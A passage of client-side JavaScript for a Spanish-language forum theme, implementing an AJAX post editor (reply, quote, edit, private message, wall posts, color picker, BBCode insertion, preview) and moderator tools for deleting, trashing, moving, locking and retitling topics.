                            ops.mode.length && (ops.mode[0].innerHTML = ops.lang.pm);
                            ops.notice && (ops.notice.innerHTML = ops.lang.notice_mp);
                            ops.editor.className = 'pm-mode';
                            ops.url = !1;
                            ops.placeholder(ops.textarea, ops.mi_nombre + ' redacta tu mensaje privado...');
                            init.fadeIn(ops.mp_info[0], 100);
                            ops.mp_info[0].innerHTML = 'Mensaje para:<p style="color:rgba(0, 0, 139, 1);font-weight:bolder;display:inline;font-size:11px">' + ops.nombre_editor + '</p>';
                            break;
                    }
                },
                post: function (c, event) {
                    // if (init.g('.fa-spinner', ops.send_button).length) return;
                    var m, n,
                        f = ops.lang.error_message,
                        t = ops.lang.success,
                        g = ops.editor.className,
                        h = ops.lang.flood_message,
                        p = {
                            message: ops.textarea.value,
                            subject: ops.subject.value,
                            post: 1,
                            prevent_post: 1,
                            notify: 1
                        },
                        colorbutton = ops.perfil.muro.currentCSS(ops.send_button).color,
                        background = ops.perfil.muro.currentCSS(ops.send_button).background;
                    ops.url ? !ops.textarea.value.length ? $.boxes('alert', ops.lang.no_message) : ops.preventDoubleClick(ops.send_button, true, false, true, event, colorbutton, background, function () {
                        ops.xmlhRequest(p, ops.url, function (c) {
                            m = c.responseXML;
                            n = init.g('.error', m);
                            init.contiene(n[0], 'El control del flood') ? $.boxes('alert', h) : ops.temas.editor.newPost(ops.temas.editor.getViewtopic(m))
                        })
                    }) : /(pm-mode)/.test(g) ? ops.temas.editor.pm(c) : ops.temas.editor.wall(c)
                },
                getViewtopic: function (c) {
                    var b, body = init.g('body', c),
                        a = init.g('a', body);
                    init.myarray(a, function (i) {
                        if (/\/viewtopic/g.test(i.href)) {
                            b = i.href
                        };
                    });
                    return b
                },
                lastHrefPage: function (a) {
                    var doc = 'undefined' == typeof a ? a : document,
                        b = init.g('.paginatop', doc),
                        c = b.length && init.last(init.g('.pag-img', b[0])),
                        i = c.childNodes[0].alt == 'Siguiente',
                        d = b.length && (i ? c : init.last(init.g('strong', b[0]))),
                        e = b.length && (i ? c.previousElementSibling.href : d.previousElementSibling.previousElementSibling.href),
                        f = b.length && (i ? e : parseInt(e.match(/(?!\/t(\d+))((p)(\d+))/g)[0].match(/\d+/)[0]) + 10),
                        g = b.length && (i ? e : document.location.href.replace(/(?!\/t(\d+))((p)(\d+))/g, 'p' + f)),
                        h = b.length ? g : document.location.href;
                    return h
                },
                reloadPost: function () {
                    ops.xmlhRequest('', ops.temas.editor.lastHrefPage(), function (o) {
                        var x = o.responseXML,
                            a = init.g('.paginatop', x).length,
                            b = init.last(init.g('.postNumber', x)).textContent.match(/\d+/g)[0],
                            d = init.g('.paginatop', x).length ? init.last(init.g('strong', init.g('.paginatop', x)[0])).textContent : 'false',
                            h = init.last(init.g('.post', x));
                        if (b != ops.ultimonumeropost && init.contiene(h, 'sprite-icon_post_target_unread')) {
                            ops.temas.editor.newPost(ops.temas.editor.lastHrefPage(x));
                            ops.ultimonumeropost = b;
                        }
                    });
                },
                newPost: function (c) {
                    var o, a, b, q, r, j, ed,
                        d = init.g('.post'),
                        g = init.g('.zeditor-new'),
                        t = /\/viewtopic/g.test(c) ? c.match(/(\w+$)/)[0] : '',
                        n = init.g('.descargar'),
                        h = window.location.href,
                        k = ops.topic_name(),
                        p = ops.mi_nombre + ' comentó en : [url=' + h + ']' + k + '[/url]',
                        m = ops.editor,
                        l = '' != t,
                        s = 'last' != t,
                        u = ops.num_sub_section != 'f13';
                    g.length && g[0].classList.remove('zeditor-new');
                    ops.xmlhRequest('', c, function (x) {
                        o = x.responseXML;
                        a = l ? init.g('#p' + t, o) : init.last(init.g('.post', o));
                        b = m.className != '' ? m.className : 'reply-mode';
                        q = s ? ' zeditor-new Nuevo' : ' zeditor-new Nuevo lastPostLoaded';
                        r = init.create('div', {
                            html: init.BB.parse(a.innerHTML)
                        });
                        switch (b) {
                            case 'reply-mode':
                            case 'quote-mode':
                                a.className += q;
                                init.replaceHtml(r, a);
                                init.move(init.last(d), a, 'after', function () {
                                    ops.temas.main.setWatch()
                                    ops.temas.main.button('.zeditor-new');
                                    init.fadeIn(a, 500);
                                    ops.temas.main.attach();
                                });
                                u && s && ops.actividadFeed(p, 'Historial');
                                a && s && ops.temas.main.offset_download(a);
                                break;
                            case 'edit-mode':
                                ops.send_button.innerHTML = ops.lang.send_button;
                                j = init.g('.zeditor-message', a);
                                ed = init.create('div', {
                                    html: init.BB.parse(j[0].innerHTML)
                                });
                                init.replaceHtml(ed, ops.message_dom, function () {
                                    ops.temas.main.attach();
                                    init.fadeIn(ops.message_dom, 500);
                                });
                                break;
                        }
                        ops.url = '';
                    });
                    if (s) {
                        ops.textarea.value = ''
                    }
                    if (l) {
                        m.classList.remove('maxim');
                        init.hide(m);
                        init.move(document.body, m, 'append');
                        ops.preventDoubleClick(ops.send_button, false);
                        ops.back(ops.backAdd());
                    }
                },
                popup: function (c, d, e, clase) {
                    var v, x, y, w;
                    v = init.g('#' + c);
                    x = v ? v : init.create('div', {
                        attributes: {
                            id: c
                        },
                        class: 'ze-popups',
                        style: {
                            display: 'none'
                        }
                    });
                    !v && init.move(init.g('#ze-popups'), x, 'append');
                    'undefined' != typeof clase && x.classList.add(clase);
                    y = 'undefined' == typeof e ? ops.editor.offsetWidth : init.g('#ops_chat').offsetWidth;
                    if (x.style.display === 'none') {
                        w = d.offsetLeft;
                        init.show(x);
                        x.style.left = w + 'px'
                    } else {
                        init.hide(x);
                        ops.textarea && ops.textarea.focus();
                    }
                    init.hide(ops.getNextSiblings(x));
                    switch (clase) {
                        case 'imgur':
                            ops.temas.main.createimgur();
                            break;
                        case 'awesome':
                            ops.temas.main.createawesome();
                            break;
                        case 'youtube_frame':
                            ops.temas.main.youtube();
                            break;
                        case 'facebook_frame':
                            ops.temas.main.facebookVideo();
                            break;
                        case 'emoticons':
                            ops.temas.main.createSmilies();
                            break;
                        case 'url':
                            ops.temas.main.createbburl();
                            break;
                        case 'gifactif':
                            ops.giphy.gifinit('editor');
                            break;
                    }
                },
                createColor: function () {
                    var b = init.g('#ze-color-inner'),
                        e = init.g('#ze-color');
                    if (!b) {
                        var i, j, k, c = '<table cellspacing="0" id="ze-color-inner">';
                        var d = ['00', '33', '66', '99', 'CC', 'FF'];
                        for (i = 5; i >= 0; i--) {
                            c = c + '<tr>';
                            for (j = 5; j >= 0; j--) {
                                for (k = 5; k >= 0; k--) {
                                    var a = d[j] + d[i] + d[k];
                                    c = c + '<td style="background: #' + a + '" title="#' + a + '"><div style="background:#' + a + '" onclick="ops.temas.editor.add(\'color=#' + a + '\', \'color\');ops.temas.editor.hideColor()"></div></td>'
                                }
                            }
                            c = c + '</tr>'
                        }
                        e.innerHTML = c + '</table><div id="ze-color-info"><div class="ze-color-input"><div>#</div><input id="ze-color-hex" maxlength="6" onkeypress="ops.temas.editor.convertHex(this)" placeholder="000000"></div><div class="ze-color-input"><div>R</div><input id="ze-color-r" maxlength="3" onkeypress="ops.convertRGB()" placeholder="000"></div><div class="ze-color-input"><div>G</div><input id="ze-color-g" maxlength="3" onkeypress="ops.temas.editor.convertRGB()" placeholder="000"></div><div class="ze-color-input"><div>B</div><input id="ze-color-b" maxlength="3" onkeypress="ops.temas.editor.convertRGB()" placeholder="000"></div><div class="editor-button-confirm" onclick="ops.temas.editor.submitColor()">OK</div></div>'
                    }
                },
                hideColor: function () {
                    init.hide(init.g('#ze-color'))
                },
                convertHex: function (c) {
                    var c = c.value,
                        d = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(c);
                    d ? (init.g('#ze-color-r').value = parseInt(d[1], 16), init.g('#ze-color-g').value = parseInt(d[2], 16), init.g('#ze-color-b').value = parseInt(d[3], 16)) : null
                },
                convertRGB: function () {
                    var e = init.g('#ze-color-r').value,
                        c = init.g('#ze-color-g').value,
                        d = init.g('#ze-color-b').value,
                        a = d | (c << 8) | (e << 16);
                    init.g('#ze-color-hex').value = (16777216 + a).toString(16).slice(1)
                },
                tag: function (c) { //modificar
                    var e = ops.nombre_editor,
                        d = ops.url_tema,
                        online = init.closest(c, '.post').getAttribute('class');
             if(!init.contiene(online, 'online')){
                    var username = e,
                        subject = ops.lang.tag_message_title + ops.topic_name(),
                        message = e + ops.lang.tag_message_content + ' [url=' + d + '] ' + ops.topic_name() + ' en el post: ' + d.match(/(\d+)$/g)[0] + '[/url]';

                    ops.i_a(null, null, subject, message, username);
                   }
                 ops.textarea.value += '@' + e + ' ';
                },
                loading: function (c) {
                    var b = init.g('#editor-loading');
                    true === c ? init.show(b) : init.hide(b)
                },
                submitColor: function () {
                    var a = init.g('#ze-color-hex');
                    if (a.value !== '') {
                        ops.temas.editor.add('color=#' + a.value, 'color')
                    } else {
                        ops.temas.editor.add('color=rgb(0, 0, 0)', 'color')
                    }
                    ops.temas.editor.hideColor()
                },
                size: function (a, b) {
                    ops.temas.editor.add('size=' + b, a)
                },
                modbox: function (a) {
                    ops.temas.editor.add('modbox=' + ops.mi_nombre, a)
                },
                selection: function () {
                    if (window.getSelection) {
                        var e = document.activeElement;
                        return (e && e.tagName.toLowerCase() in {
                            textarea: 1,
                            input: 1
                        }) ? e.value.substring(e.selectionStart, e.selectionEnd) : window.getSelection().toString();
                    } else if (document.selection.createRange) {
                        return (document.selection.createRange()).text || '';
                    }
                    return null;
                },
                add: function (e, t, n) {
                    var a = 'undefined' == typeof n ? ps || tm || mp || ind ? ops.textarea : init.g('#AAGquickvm_message') : init.g('none' != init.g('#ops_message').style.display ? '#ops_message' : '#ops_textarea'),
                        s = 'undefined' == typeof t || '' == t ? e : t,
                        o = document.selection ? document.selection.createRange().text : a.value.substring(a.selectionStart, a.selectionEnd),
                        c = '[' + e + ']' + o + '[/' + s + ']';
                    if (document.selection) {
                        var i = ops.temas.editor.getCaret(a) + e.length + 2;
                        document.selection.createRange().text = c;
                        var l = a.createTextRange();
                        l.collapse(!0), l.moveStart('character', i), l.moveEnd('character', o.length), l.select()
                    } else {
                        var i = a.selectionStart + e.length + 2,
                            o = a.selectionEnd + e.length + 2;
                        a.value = a.value.substring(0, a.selectionStart) + c + a.value.substring(a.selectionEnd, a.value.length), a.setSelectionRange(i, o), a.focus()
                    }
                },
                getCaret: function (a) {
                    a.focus();
                    var r = document.selection.createRange();
                    if (r == null) {
                        return 0;
                    }
                    var re = a.createTextRange(),
                        rc = re.duplicate();
                    re.moveToBookmark(r.getBookmark());
                    rc.setEndPoint('EndToStart', re);
                    var add_newlines = 0;
                    for (var i = 0; i < rc.text.length; i++) {
                        if (rc.text.substr(i, 2) == '\r\n') {
                            add_newlines += 2;
                            i++;
                        }
                    }
                    return rc.text.length + add_newlines;
                },
                quote: function (c, f) {
                    ops.temas.editor.loading(true);
                    ops.xmlhRequest('', c.href, function (t) {
                        var e = t.responseXML,
                            a = init.g('#editor-textarea', e);
                        ops.textarea.value += a.value.replace(/]/, '][quotelink="' + window.location.pathname + '#' + f + '"]') + '\n\n';
                        console.log('debug quote',location.pathname + '#' + f );
                        ops.textarea.focus();
                        ops.temas.editor.loading(false);
                    })
                },
                quoteSelection: function () {
                    ops.textarea.value += '[quote="' + ops.nombre_editor + '"]' + ops.temas.editor.selection() + '[/quote]';
                    ops.textarea.focus();
                    ops.temas.editor.loading(false)
                },
                edit: function (c) {
                    ops.temas.editor.loading(true);
                    ops.url = c.href;
                    '' !== ops.textarea.value ? $.boxes({
                        mode: 'confirm',
                        title: ops.mi_nombre + ' de continuar perderas lo escrito',
                        ok: function () {
                            ops.temas.editor.editNext()
                        },
                        cancel: function () {
                            ops.textarea.focus(), ops.temas.editor.loading(false)
                        }
                    }) : ops.temas.editor.editNext()
                },
                editNext: function () {
                    ops.xmlhRequest('', ops.url, function (c) {
                        var e = c.responseXML;
                        ops.textarea.value = init.g('#editor-textarea', e).value;
                        ops.subject.value = init.g('.titulo_del_post', e)[0].value;
                        ops.textarea.focus();
                        ops.temas.editor.loading(false)
                    })
                },
                advance: function () {
                    var e, a = ops.editor.className,
                        b = init.g('.pm-mode')[0],
                        c = ops.textarea,
                        t = ops.id_tema;
                    window.onbeforeunload = !1;
                    switch (a) {
                        case 'quote-mode':
                        case 'edit-mode':
                            location.href = ops.url;
                            break;
                        case 'pm-mode':
                            e = ops.autor_id;
                            '' === c.value ? location.href = 'privmsg?mode=post&u=' + e : (location.href = 'privmsg?mode=post&u=' + e, ops.storage(t, c.value, 'salvando texto del mp'), Cookies.set('_id_tema_', t));
                            break;
                        case 'reply-mode':
                            if ('' != c.value) {
                                location.href = ops.url;
                                ops.storage(t, c.value, 'salvando texto del editor');
                            } else {
                                location.href = ops.url
                            }
                            break;
                        case 'wall-mode':
                            if ('' != c.value) {
                                location.href = '/privmsg?mode=post_profile&u=' + ops.autor_id;
                                ops.storage(t, c.value, 'salvando texto del editor');
                                Cookies.set('_id_tema_', t);
                            } else {
                                location.href = '/privmsg?mode=post_profile&u=' + ops.autor_id
                            }
                            break
                    }
                },
                maxim: function () {
                    var a = ops.editor ? ops.editor : init.g('#ze-editor');
                    a.classList.toggle('maxim')
                },
                cancel: function () {
                    var a = init.g('.long_post'),
                        b = ops.postActivo;
                    ops.backClose();
                    init.hide(ops.editor);
                    init.move(document.body, ops.editor, 'append');
                    a.length && (a[0].style.height = '400px');
                    ops.scroll.top(init.g('.postNumberContainer', b)[0], 200);
                    window.onbeforeunload = 'false';
                    ops.postActivo = '';
                },
                closePreview: function (c, event) {
                    var a = init.g('#topicPreview-container'),
                        b = init.g('#previewAjax'),
                        d = function () {
                            ops.backClose('#topicPreview-container')
                        };
                    Cookies.get('preview_topic') ? (tm ? (init.hide(a), Cookies.remove('preview_topic'), ops.editor.style.zIndex = '500') : d()) : ind ? (b && init.borrar(init.g('#previewAjax')), d()) : d()
                }, //preview
                preview: function (c, event) {
                    var h, i, l, x,j, contenido,
                        d = document.forms.post,
                        a = tm ? ops.url  : d.action,
                        g = ops.lang.preview_button,
                        b = ops.serialize(d) + '&preview=1';
                    ops.preventDoubleClick(c, true, false, false, event, ops.perfil.muro.currentCSS(c).color, undefined, function () {
                        ops.xmlhRequest(b, a, function (xml) {
                            x = xml.responseXML;
                            contenido = init.g('.content', x)[0].innerHTML;
                            j = init.create('div', {
                                class: 'post',
                                attributes: {
                                    id: 'previewAjax'
                                },
                                style: {
                                    background: 'none',
                                    border: 'none',
                                    width: '100%',
                                },
                                childs: [{
                                    tag: 'div',
                                    class: 'content',
                                    html: init.BB.parse(contenido)
                                }]
                            });

                            Cookies.set('preview_topic', 1);
                            tm && (ops.editor.style.zIndex = '0');
                            ops.box(j, 'Previsualizar');
                            ops.preventDoubleClick(c, false);
                            ops.temas.main.imgauto();
                            ops.temas.main.youtubeEmbed();
                            ops.temas.main.panda()
                        })
                    })
                },
                pm: function (c) {
                    var t = ops.nombre_editor,
                        d = ops.lang.pm_message_title + ' ' + ops.topic_name(),
                        f = ops.textarea.value,
                        g = '/privmsg?mode=post&post=1',
                        h = 'inbox',
                        i = 'post',
                        j = ' tu mensaje privado se envió con éxito',
                        k = 'Send',
                        m = ops.mode[0].textContent;
                    t.length > 0 ? (ops.temas.main.post_mw(t, d, f, g, i, j, h, k, false), ops.backClose(), (m === 'Modo: Mensaje Privado' || m === 'Modo: Muro') && (ops.textarea.value = '', init.fadeOut(ops.editor, 200)), ops.textarea.placeholder = ops.mi_nombre + j) : $.boxes('alert', ops.lang.pm_message_error)
                },
                wall: function (c) {
                    var t = ops.nombre_editor,
                        d = ops.lang.wall_message_title + ' ' + ops.topic_name(),
                        f = ops.textarea.value,
                        g = '/privmsg',
                        h = 'profile',
                        i = 'post_profile',
                        j = ' tu mensaje al muro se envió con éxito',
                        k = '1',
                        m = ops.mode[0].textContent;
                    t.length > 0 ? (ops.temas.main.post_mw(t, d, f, g, i, j, h, k, false), ops.backClose(), (m === 'Modo: Mensaje Privado' || m === 'Modo: Muro') && (ops.textarea.value = '', init.fadeOut(ops.editor, 200)), ops.textarea.placeholder = ops.mi_nombre + j) : $.boxes('alert', ops.lang.pm_message_error);
                },
                innerHTML_save: function () {
                    'Guardar' == ops.send_button.innerHTML && (ops.send_button.innerHTML = 'Enviar')
                },
                nuevoComentario: function () {
                    if (ops.logout) {
                        var a, f = '',
                            n = init.create('div', {
                                class: 'new_comment',
                                style: {
                                    background: 'none repeat scroll 0 0 rgb(173, 216, 230)',
                                    color: 'rgba(74, 74, 74, 1)',
                                    fontWeight: '800',
                                    padding: '0px 3px',
                                    display: 'inline',
                                    borderRadius: '2px',
                                    marginLeft: '2px',
                                    fontFamily: 'monda',
                                    fontSize: '11px',
                                    textShadow: ' 0 1px rgba(255, 255, 255, 1)'
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-bomb',
                                }, {
                                    tag: 'span',
                                    text: 'Nuevo comentario'
                                }]
                            }),
                            b = init.g('.Nuevo');
                        init.myarray(b, function (i) {
                            a = init.g('.author', i)[0];
                            init.move(a, n, 'prepend')
                        })
                    }
                },
                keyupTextarea: function () {
                    if (ops.logout) {
                        var i = pu && ops.perfil.main.tabId('muro'),
                            a = init.g(tm ? '#editor-textarea' : i ? '#AAGquickvm_message' : ind && '#avac_status_textarea'),
                            e = tm && init.g('#avatar');
                        tm && (e.innerHTML = ops.mi_avatar);
                        a && a.addEventListener('keyup', function () {
                            !init.g('.prompt').length && ops.temas.main.arroba(this);
                            tm && (0 != a.value ? init.fadeOut(e, 200) : init.fadeIn(e, 200), this.addEventListener('blur', function () {
                                init.fadeIn(e, 200)
                            }))
                        }, false);
                    }
                },
                limite: {
                    main: function (d) {
                        if (/f(4|5|6|7|11|16)/.test(ops.num_sub_section) && ops.download.length && /(reply|quote)/.test(d)) {
                            var a, b = ops.textarea;
                            ops.temas.editor.limite.activar(ops.temas.editor.limite.contar());
                            b.addEventListener('keyup', function () {
                                a = ops.temas.editor.limite.contar();
                                init.replaceHtml(ops.temas.editor.limite.html(a), ops.notice);
                                a >= 4 && ops.temas.editor.limite.activar(a);
                            }, false)
                        }
                    },
                    contar: function () {
                        var b = ops.textarea,
                            o = b.value.match(/\w{2,}\b/g),
                            a = null === o ? '0' : o.length;
                        return a
                    },
                    html: function (a) {
                        var e = 4 > a ? 'rgb(255, 0, 0)' : 'rgba(0, 128, 0, 1)',
                            t = 4 - a > 1 ? 's' : '',
                            r = 3 > 4 - a || 0 == a ? 's' : '',
                            n = 4 - a > 1 ? 'n' : '',
                            i = 4 > a ? 'palabra' + r + '. Te falta' + n + ' ' + (4 - a) + ' palabra' + t + ' para poder enviar este mensaje' : 'palabras. Ya puedes enviar el mensaje ',
                            l = 4 > a ? 'fa fa-exclamation-circle' : 'fa fa-check-circle',
                            o = init.create('div', {
                                childs: [{
                                    tag: 'i',
                                    class: l,
                                    style: {
                                        verticalAlign: 'bottom',
                                        boxShadow: 'none',
                                        border: 'none',
                                        color: e,
                                        margin: '2px',
                                        fontSize: '16px'
                                    }
                                }, {
                                    tag: 'text',
                                    text: 'Has escrito'
                                }, {
                                    tag: 'strong',
                                    style: {
                                        color: e,
                                        margin: '3px'
                                    },
                                    text: a
                                }, {
                                    tag: 'text',
                                    text: i
                                }]
                            });
                        return o
                    },
                    activar: function (a) {
                        var b = ops.send_button;
                        init.elem(b, {
                            style: {
                                opacity: a >= 4 ? '1' : '0.6'
                            },
                            onclick: a >= 4 ? 'ops.temas.editor.post(this);window.onbeforeunload = false' : 'return false'
                        });
                    },
                },
            }
        },
        mod: {
            init: function () {
                var a = init.g('.moderar');
                init.myarray(a, function (e) {
                    var b = init.g('a', e);
                    init.myarray(b, function (i) {
                        var onclick, c = i.href.match(/(mode=)(\w+)/g) && i.href.match(/(mode=)(\w+)/g)[0];
                        i.addEventListener('click', function (e) {
                            e.preventDefault();
                            switch (c) {
                                case 'mode=delete':
                                    ops.mod.delete(this);
                                    break
                                case 'mode=trash':
                                    ops.mod.trash.main(this);
                                    break
                                case 'mode=move':
                                    ops.mod.move.main(this);
                                    break
                                case 'mode=lock':
                                    ops.mod.lock.main('lock');
                                    break
                                case 'mode=unlock':
                                    ops.mod.lock.main('unlock');
                                    break
                            }
                        }, false);

                    });
                });
            },
            ip: function (c) {
                ops.xmlhRequest('', c.href, function (o) {
                    var x = o.responseXML,
                        post = init.closest(c, '.post'),
                        nick = init.g('.nick', post)[0].textContent,
                        html = init.g('.ip_panel', x)[0].innerHTML;
                    ops.box(html, 'Revisar direcciones ip de ' + nick)
                });
            },
            delete: function (e) {
                $.boxes({
                    mode: 'confirm',
                    title: '¿Deseas eliminar este tema',
                    ok: function () {
                        ops.xmlhRequest('confirm=1', e.href, function () {
                            $.boxes('alert', 'Tema borrado');
                            location.href = '/';
                        });
                    }
                });
            },
            trash: {
                main: function (href) {
                    var a = href.href;
                    ops.xmlhRequest('', a, function () {
                        ops.mod.trash.go()
                    });
                },
                go: function () {
                    ops.mod.recuperarDatos(ops.path_edit, function (xml, titulo, message, topictype) {
                        var n = ops.mod.reemplazar(titulo, '[rechazado]'),
                            a = message + '\n [b]Mensaje automático[/b]\n\n\n\n[ok]Se movio el tema a la papelera[/ok]';
                        ops.mod.cambiarPath();
                        ops.mod.trash.face();
                        ops.temas.main.editarElPrimerPost(n, a, '1', topictype, ops.id_f_post, '', function () {
                            ops.mod.todoslostitulos(n)
                        });
                        ops.actividadFeed(ops.mi_nombre + ' envió a la papelera el tema: [url=' + window.location.href + ']' + ops.topic_name() + '[/url]', 'Historial');
                    });
                },
                face: function () {
                    var s = init.g('.lock-theme'),
                        o = init.g('.titulo-tema')[0],
                        u = init.g('.fa-lock'),
                        a = {
                            position: 'absolute',
                            marginTop: '-260px',
                            fontSize: '90px',
                            marginLeft: '10px',
                            textShadow: 'none',
                            color: 'rgb(165, 42, 42)'
                        };
                    if (s.length && u.length) {
                        u[0].classList.add('fa', 'fa-trash');
                        init.Style(u[0], a)
                    } else {
                        o.classList.add('lock-theme');
                        init.move(o, init.create('i', {
                            class: 'fa fa-trash',
                            style: a
                        }), 'prepend');
                    }
                    o.style.background = 'url(https://allphpbb31.com/trash.png) rgba(255,255,136,1)!important';
                }
            },
            move: {
                main: function (c) {
                    ops.back(ops.backAdd());
                    var url = '/modcp?mode=move&t=' + ops.id_tema + '&tid=' + ops.tid;
                    ops.xmlhRequest('', url, function (xml) {
                        var x = xml.responseXML,
                            html = init.g('.move-theme', x)[0],
                            ok = init.g('.button2', html)[0],
                            titulo = 'Mover el tema: ' + ops.topic_name();
                        ok.setAttribute('onclick', 'ops.mod.move.do(this);return false');
                        ops.box(html.outerHTML, titulo);
                    });
                },
                do: function (e) {
                    var viejoforo = init.g('.nav')[1].textContent,
                        i = init.g('.move-theme')[0],
                        a = init.g('select', i),
                        n = a[0].options[a[0].selectedIndex],
                        nuevopath = n.value,
                        nuevoforo = n.textContent.match(/[A-Za-z0-9_]+.*/)[0],
                        b = 'Debes seleccionar un subforo antes de enviar';
                    e.value = 'Moviendo...'; -
                    1 != nuevopath ? (ops.mod.move.go(nuevopath, nuevoforo, viejoforo)) : (ops.toolbar.notify.go(b, null, 'alert', 'fas fa-exclamation-circle'));
                },
                go: function (nuevopath, nuevoforo, viejoforo) {
                    var a = init.g('.move-theme'),
                        b = 'confirm=1&new_forum=' + nuevopath,
                        f = '[b]Mensaje automático[/b]\n\n\n\n[ok]Se movio el tema del subforo ' + viejoforo + ' a ' + nuevoforo + '[/ok]',
                        g = ops.mi_nombre + ' movió el tema: [url=' + window.location.href + ']' + ops.topic_name() + '[/url] a ' + nuevoforo;
                    ops.xmlhRequest(b, '/modcp?mode=move&t=' + ops.id_tema + '&tid=' + ops.tid, function () {
                        ops.mod.cambiarPath();
                        a.length && (a[0].innerHTML = '<br/><br/><br/><br/><br/>' + ops.ajax_load);
                        ops.actividadFeed(g);
                        ops.toolbar.notify.go('El tema se movio satisfactoriamente', null, 'check', 'fas fa-check-double');
                        ops.backClose();
                        ops.mod.postear(f)
                    })
                },
            },

            lock: {
                main: function (e, o) {
                    var t, n = '/modcp?mode=' + e + '&t=' + ops.id_tema + '&tid=' + ops.tid,
                        r = 'lock' == e,
                        i = '[b]Mensaje automático[/b]\n\n\n\n[ok]' + (r ? 'Cierro tema' : 'Re-abro el tema') + '[/ok]',
                        a = ' ' + (r ? 'cerró' : 'abrió') + ' el tema: ',
                        c = ops.mi_nombre + a + '[url=' + window.location.href + ']' + ops.topic_name() + '[/url]',
                        o = 1 == o ? !0 : !1,
                        l = init.g('#url_a_t'),
                        m = init.g('.en-curso', l),
                        d = init.g('.prefijo', l),
                        s = init.g('.cerrado', l),
                        u = l.innerHTML.match(/[^<>]+(?=[<])/g),
                        g = function (e) {
                            var o = '';
                            return e.length && init.myarray(e, function (e) {
                                null != e.match(/\w+/g) && (o += '[' + e + ']')
                            }), o
                        },
                        p = g(u),
                        h = m.length ? '[resuelto]' : '[cerrado]' + p,
                        f = d.length && !m.length ? '[cerrado]' + p : '[cerrado]';
                    t = r ? o ? o && m.length ? '[resuelto]' : h : f : 1 == d.length && s.length ? '' : d.length > 1 && s.length ? p.replace(/\[cerrado\]/, '') : p;
                    ops.mod.editartitulo.cambiarPrefijo(t);
                    ops.mod.lock.button(r);
                    ops.mod.lock.face(r);
                    ops.actividadFeed(c, 'Historial');
                    setTimeout(function () {
                        ops.xmlhRequest('', n, function () {
                            ops.mod.postear(i)
                        }, 1e3)
                    })

                },
                button: function (g) {
                    var c = '/modcp?mode=' + (g ? 'un' : '') + 'lock&t=',
                        d = g ? 'https://hitsk.in/t/20/69/64/i_topic_unlock.png' : 'https://hitsk.in/t/20/69/64/i_topic_lock.png',
                        e = (g ? 'Desbloquear' : 'Cerrar') + ' este tema',
                        f = init.g('.moderar');
                    init.myarray(f, function (i) {
                        var a = init.g('a', i);
                        init.myarray(a, function (i) {
                            if (i.href.indexOf('lock&t=') >= 0) {
                                i.href = c + ops.id_tema + '&tid=' + isTid;
                                i.firstChild.src = d;
                                i.firstChild.alt = e;
                                i.onclick = 'ops.mod.lock.main(this,\'' + (g ? 'un' : '') + 'lock\');return false';
                            }
                        })
                    });
                },
                face: function (g) {
                    var n = init.g('.pbutton1'),
                        j = init.g('.titulo-tema')[0],
                        l = '<i class="fa fa-lock tema_bloqueado"></i>',
                        m = '/post?t=' + ops.id_tema + '&mode=reply';
                    if (g) {
                        j.classList.add('lock-theme');
                        j.style.background = 'url(' + ops.lang.l_iM + ')rgba(237,36,20,0.35)';
                        init.insertar(j, l, 'prepend');
                        init.myarray(n, function (i) {
                            i.removeAttribute('onclick');
                            i.textContent = 'Tema Cerrado';
                        })
                    } else {
                        j.classList.remove('lock-theme');
                        j.removeAttribute('style');
                        init.borrar(j.firstChild);
                        init.myarray(n, function (i) {
                            i.setAttribute('onclick', 'ops.temas.editor.start(\'reply\', this, \'' + m + '\')');
                            i.textContent = 'Responder';
                        })
                    }
                }
            },
            ver: function () {
                var t, e = init.g('.no_code'),
                    f = init.g('.long_post');
                init.myarray(e, function (i) {
                    init.show(i);
                });
                init.myarray(f, function (i) {
                    i.style.height = '100%'
                });
                e.length && (ops.scroll.top(e[0], 300));
            },
            enCurso: function () {
                ops.mod.editartitulo.cambiarPrefijo('[en curso]')
            },
            resuelto: {
                main: function () {
                    var g = 'Pedidos resueltos',
                        h = 'Temas resueltos',
                        i = '\n \n [b]Mensaje automático[/b]\n\n\n\n[ok]Cierro tema, y muevo a [b]' + ops.num_sub_section == 'f12' ? g : h + '[/b][/ok]';

                    ops.mod.move.go('f3', 'temas resueltos', 'soporte');
                    ops.mod.lock.main('lock', true);

                },
            },
            reemplazar: function (e, t) {
                var o = /\[.*?\]/g,
                    t = 'undefined' != typeof t ? t : '',
                    n = e.match(o) ? e.replace(o, '') : e;
                return t + n
            },
            editartitulo: {
                div: function (c) {
                    return init.create('input', {
                        attributes: {
                            id: 'edit_ajax_title',
                            placeholder: 'Escribe el título',
                            type: 'text',
                            name: 'subject',
                            value: c,
                        },
                        class: 'inputbox medium',
                        style: {
                            zIndex: '900',
                            marginTop: '-21px',
                            fontSize: '12px',
                            width: '600 px',
                        },
                    });
                },
                input: function () {
                    if (ops.soy_staff) {
                        ops.mod.recuperarDatos(ops.path_edit, function (xml, c, d, topictype) {
                            var j,
                                b = ops.id_f_post,
                                f = init.g('#url_a_t'),
                                input = ops.mod.editartitulo.div(c);
                            init.hide(f);
                            init.move(f, input, 'after', function (destino, j) {
                                j.addEventListener('keydown', function (t) {
                                    13 === t.keyCode && ops.temas.main.editarElPrimerPost(this.value, d, '', topictype, b, '', function () {
                                        ops.mod.editartitulo.done(j, f);
                                    })
                                }, false);
                            })
                        })
                    }
                },
                done: function (e, f) {
                    var a = opensource.ready(e.value);
                    f.innerHTML = a;
                    init.show(f, 'inline-block');
                    init.borrar(e);
                    ops.toolbar.notify.go('Se cambio el título a: ' + a, null, 'check', 'fas fa-check-double');
                },
                cambiarPrefijo: function (e) {
                    var t = init.g('#edit_ajax_title');
                    t ? (t.value = ops.mod.reemplazar(t.value, e)) : ops.mod.recuperarDatos(ops.path_edit, function (xml, titulo, message, topictype) {
                        finalPP = titulo;
                        var subject = ops.mod.reemplazar(titulo, e),
                            id = ops.id_f_post;
                        ops.temas.main.editarElPrimerPost(subject, message, '1', topictype, id, '', function () {
                            ops.mod.t, ops.mod.todoslostitulos(subject)
                        })
                    })
                },
            },
            recuperarDatos: function (url, f) {
                ops.xmlhRequest('', url, function (i) {
                    var xml = i.responseXML,
                        form = xml.forms.post,
                        r = form && init.g('#type_toogle', xml),
                        titulo = form ? xml.forms.post.subject.value : '',
                        message = form ? xml.forms.post.message.value : '',
                        topictype = form ? ops.topictype(init.g('input', r)) : '';
                    formTest = form;
                    f(xml, titulo, message, topictype)
                });
            },
            cambiarPath: function () {
                ops.xmlhRequest('', location.pathname, function (X) {
